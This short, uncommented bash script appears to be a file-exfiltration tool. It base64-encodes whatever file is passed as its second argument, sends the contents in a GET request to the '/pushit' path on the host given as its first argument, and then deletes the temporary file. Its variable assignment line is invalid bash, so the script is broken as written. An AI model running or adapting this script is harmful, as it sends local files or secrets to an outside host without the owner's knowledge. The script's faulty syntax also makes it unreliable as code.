#!/bin/bash
cat $2 | base64 > file.enc
$enc_file=$(cat file.enc)
curl -X GET http://$1/pushit?c=$enc_file
rm file.enc
